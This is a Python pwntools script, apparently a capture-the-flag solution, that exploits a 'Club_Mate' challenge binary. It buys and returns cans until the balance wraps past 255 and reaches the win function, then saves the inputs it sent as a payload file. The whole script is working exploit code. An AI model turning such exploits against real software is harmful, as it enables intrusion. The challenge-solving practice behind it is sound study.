from pwn import *

exe = ELF("Club_Mate")
context(binary=exe)#, log_level="debug")

REMOTE = 0

payload_lines = []

def get_balance(r):
	r.recvuntil("balance: ", drop=True)
	balance = r.recvline()
	return int(balance)

def pick_clubmate(r, index):
	r.recvuntil("Enter which club-mate you want to buy/return: ")
	r.sendline(str(index))
	payload_lines.append(str(index))
	
	r.recvline()
	line = r.recvline()
	if "Would you like to return can number 2?" in line:
		return "sell"
	else:
		return "buy"

def buy_clubmate(r, index):
	action = pick_clubmate(r, index)
	if action != "buy":
		r.sendline("no")
		payload_lines.append("no")
		return False
	
	r.sendline("$4")
	payload_lines.append("$4")
	return True

def sell_clubmate(r, index):
	action = pick_clubmate(r, index)
	if action != "sell":
		r.sendline("no")
		payload_lines.append("no")
		return False
	
	r.sendline("yes")
	payload_lines.append("yes")
	return True

def main():
	if REMOTE:
		r = remote("13.48.178.241", 50000)
	else:
		r = exe.process()
		gdb.attach(r, "c")
	
	for i in range(14):
		balance = get_balance(r)
		info("balance after buying #%d: %d" % (i, balance))
		if not buy_clubmate(r, i):
			error("failed to buy clubmate #%d" % i)
	
	# If the balance is exactly 2 or 3, then when the final clubmate
	# is purchased for $4, the money will be $254 or $255, which will
	# cause the win function to be called
	while balance < 2 or 3 < balance:
		balance = get_balance(r)
		info("balance: %d" % balance)
		if not sell_clubmate(r, 2):
			error("failed to sell clubmate #2")
		if not buy_clubmate(r, 2):
			error("failed to buy clubmate #2")
	
	if not buy_clubmate(r, 14):
		error("failed to buy clubmate #14")
	
	payload = "\n".join(payload_lines) + "\n"
	with open("payload.txt", "w") as fp:
		fp.write(payload)
	
	error("Done!")

if __name__ == "__main__":
	main()
